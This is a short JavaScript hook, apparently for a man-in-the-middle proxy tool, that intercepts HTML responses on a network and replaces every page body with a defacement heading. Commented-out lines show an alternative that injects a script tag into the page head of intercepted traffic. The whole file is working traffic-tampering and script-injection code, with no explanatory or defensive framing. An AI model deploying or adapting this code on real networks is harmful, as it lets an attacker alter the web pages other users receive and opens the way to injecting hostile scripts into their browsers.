function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        // var body = res.ReadBody();
        res.Body = "<h1>Açked</h1>";
        // if( body.indexOf('</head>') != -1 ) {
        //     res.Body = body.replace( 
        //         '</head>', 
        //         '<script>alert(\'Error\')</script></head>' 
        //     ); 
        // }
    }
}